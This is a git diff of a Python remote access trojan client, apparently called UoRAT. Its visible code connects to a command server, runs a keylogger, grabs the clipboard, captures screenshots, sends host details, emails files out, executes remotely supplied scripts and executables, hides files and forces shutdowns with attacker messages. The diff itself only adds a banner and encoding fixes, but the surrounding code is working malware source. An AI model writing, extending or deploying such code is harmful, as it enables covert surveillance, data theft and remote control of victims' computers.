@@ -72,7 +72,26 @@ class Client:
             #"-WCSend": self.sendwebcam
         }
         self.Keylogger = type(Keylogger)
+    def label(self):
+        print('''UUUUUUUU     UUUUUUUU                RRRRRRRRRRRRRRRRR                  AAA         TTTTTTTTTTTTTTTTTTTTTTT
+U::::::U     U::::::U                R::::::::::::::::R                A:::A        T:::::::::::::::::::::T
+U::::::U     U::::::U                R::::::RRRRRR:::::R              A:::::A       T:::::::::::::::::::::T
+UU:::::U     U:::::UU                RR:::::R     R:::::R            A:::::::A      T:::::TT:::::::TT:::::T
+ U:::::U     U:::::U   ooooooooooo     R::::R     R:::::R           A:::::::::A     TTTTTT  T:::::T  TTTTTT
+ U:::::D     D:::::U oo:::::::::::oo   R::::R     R:::::R          A:::::A:::::A            T:::::T        
+ U:::::D     D:::::Uo:::::::::::::::o  R::::RRRRRR:::::R          A:::::A A:::::A           T:::::T        
+ U:::::D     D:::::Uo:::::ooooo:::::o  R:::::::::::::RR          A:::::A   A:::::A          T:::::T        
+ U:::::D     D:::::Uo::::o     o::::o  R::::RRRRRR:::::R        A:::::A     A:::::A         T:::::T        
+ U:::::D     D:::::Uo::::o     o::::o  R::::R     R:::::R      A:::::AAAAAAAAA:::::A        T:::::T        
+ U:::::D     D:::::Uo::::o     o::::o  R::::R     R:::::R     A:::::::::::::::::::::A       T:::::T        
+ U::::::U   U::::::Uo::::o     o::::o  R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A      T:::::T        
+ U:::::::UUU:::::::Uo:::::ooooo:::::oRR:::::R     R:::::R   A:::::A             A:::::A   TT:::::::TT      
+  UU:::::::::::::UU o:::::::::::::::oR::::::R     R:::::R  A:::::A               A:::::A  T:::::::::T      
+    UU:::::::::UU    oo:::::::::::oo R::::::R     R:::::R A:::::A                 A:::::A T:::::::::T      
+      UUUUUUUUU        ooooooooooo   RRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAATTTTTTTTTTT 
 
+27016005
+''')
     def disc(self):
         sys.exit()
 
@@ -85,7 +104,7 @@ class Client:
         self.client.connect((self.SERVER_IP, self.PORT))
 
     def confirmconnection(self):
-        gendkey = self.client.recv(self.BUFFER_SIZE).decode()
+        gendkey = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
         # print(gendkey)
         acceptancecode = input("Enter the Given Key: ")
 
@@ -115,11 +134,9 @@ class Client:
         while True:
             if sys.getsizeof(full) >= size:
                 break
-
             recvfile = self.client.recv(buff)
 
             full += recvfile
-
         return full
 
     def sendHostInfo(self):
@@ -146,7 +163,6 @@ class Client:
             "Windows Platform": platform.win32_ver()
             #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
         }
-        # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
         cpu = platform.processor()
         system = platform.system()
         machine = platform.machine()
@@ -176,11 +192,11 @@ class Client:
                 print(i[2:-2])
                 f.write(i[2:-2] + "\n")
         with open('./logs/moreinfoC.txt', 'rb+') as f:
-            # self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode())
+            # self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode('utf-8'))
             c = f.read()
             print(len(c))
             time.sleep(1)
-            self.client.send((str(len(c))).encode())
+            self.client.send((str(len(c))).encode('utf-8'))
             time.sleep(1)
             self.client.send(c)
 
@@ -197,7 +213,7 @@ class Client:
         self.locksystem()
 
     def shutdownmessage(self):
-        message = self.client.recv(self.BUFFER_SIZE).decode()
+        message = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
         msg = "shutdown /s /e '" + message + "' "
         # msg = "shutdown /s /e 'You've been hacked '"
         self.runrun(msg)
@@ -242,14 +258,14 @@ class Client:
         self.Keylogger = Keylogger()
         kThread = threading.Thread(target=self.Keylogger.log)
         kThread.start()
-        self.client.send("*** SUCCESSFULLY STARTED LOGGER ***".encode())
+        self.client.send("*** SUCCESSFULLY STARTED LOGGER ***".encode('utf-8'))
 
     def disableKeyLogger(self):
         keyboard = Controller()
         keyboard.press(Key.esc)
         keyboard.release(Key.esc)
         print("KEYLOGGER KILLED")
-        self.client.send("*** KEY LOGGER KILLED ***".encode())
+        self.client.send("*** KEY LOGGER KILLED ***".encode('utf-8'))
 
     def keylogs(self):
             try:
@@ -277,7 +293,7 @@ class Client:
                 self.client.send("[ERROR]".encode("utf-8"))
 
     def clipboardgrab(self):
-        self.client.send(getClipBoard().encode())
+        self.client.send(getClipBoard().encode('utf-8'))
 
 # ''' CMD Functions '''
     def runprocess(self, msg):
@@ -302,7 +318,7 @@ class Client:
             # print("This failed too (runrun) : " + str(e) + " + " + str(obj))
 
     def MSGBOX(self):
-        insert = self.client.recv(self.BUFFER_SIZE).decode()
+        insert = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
         try :
             msgA = '(echo MsgBox "' + insert + '" ^& vbCrLf ^& "Line 2",262192, "Title")> File.vbs'
             self.runrun(msgA)
@@ -316,9 +332,9 @@ class Client:
 
     def txtmsg(self):
         print("[!] TextMessageMode: Activated")
-        message = self.client.recv(self.BUFFER_SIZE).decode()
+        message = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
         print("Server:", message)
-        # self.send(output.encode())
+        # self.send(output.encode('utf-8'))
         time.sleep(2)
         self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
@@ -344,8 +360,8 @@ class Client:
 
     def filerecv(self):
         # obtain the name to save the file as, and the expected size
-        filename = self.client.recv(self.BUFFER_SIZE).decode()
-        filesize = self.client.recv(self.BUFFER_SIZE).decode()
+        filename = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
+        filesize = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
 
         # if the size is bigger than regular buffer, adjust -> "SaveBigFile"
         if int(filesize) >= self.BUFFER_SIZE:
@@ -375,9 +391,9 @@ class Client:
             # self.runrun(msg)
 
     def email(self):
-        filename = self.client.recv(self.BUFFER_SIZE).decode()
+        filename = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
         status = emailsendfilepath(filename)
-        self.client.send(status.encode())
+        self.client.send(status.encode('utf-8'))
 
     def endless(self):
         global run
@@ -390,6 +406,7 @@ class Client:
             self.client.send("2".encode("utf-8"))
             self.confirmconnection()
         #self.startEmailthread()
+        self.label()
         while run:
             print("entered loop")
             msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
@@ -406,25 +423,27 @@ class Client:
                 self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
     def exePy(self):
-        path2script = self.client.recv(self.BUFFER_SIZE).decode()
+        path2script = self.client.recv(self.BUFFER_SIZE).decode('utf-8')
         try:
             if ".py" in path2script:
                 exec(open(path2script).read())
             elif ".exe" in path2script:
                 try:
                     os.startfile(path2script)
-                except:
+                except Exception as ex:
+                    print(".exe? " + str(ex))
                     pass
             else:
                 try:
                     msg = "cmd /c " + path2script
                     self.runrun(msg)
-                except: 
+                except Exception as sc:
+                    print(".script? " + str(sc))
                     pass
-            self.client.send("[*] SUCCESS".encode())
+            self.client.send("[*] SUCCESS".encode('utf-8'))
 
         except Exception as e:
-            self.client.send(("[!!] FAILURE + " + str(e)).encode())
+            self.client.send(("[!!] FAILURE + " + str(e)).encode('utf-8'))
 
     def hidefile(self, filepath):
         command = "attrib +h "+filepath+""
@@ -436,7 +455,7 @@ class Client:
             #ss.shot(mon=1, output='./logs/screen{}.png'.format(self.sscount))
             ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
             picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
-            self.client.send(str(picsize).encode())
+            self.client.send(str(picsize).encode('utf-8'))
             time.sleep(0.1)
             with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
                 tosend = screen.read()
@@ -500,12 +519,12 @@ class Client:
         eThreadActive = True
         eThread = threading.Thread(target=Scheduler)
         eThread.start()
-        self.client.send("[*] Success".encode())
+        self.client.send("[*] Success".encode('utf-8'))
 
     def stopEmailThread(self):
         global eThreadActive
         eThreadActive = False
-        self.client.send("*** Email Thread Killed ***".encode())
+        self.client.send("*** Email Thread Killed ***".encode('utf-8'))
 # ''' STATIC METHODS '''
 def getClipBoard():
     cb = pyperclip.paste()  # getting the clipboard
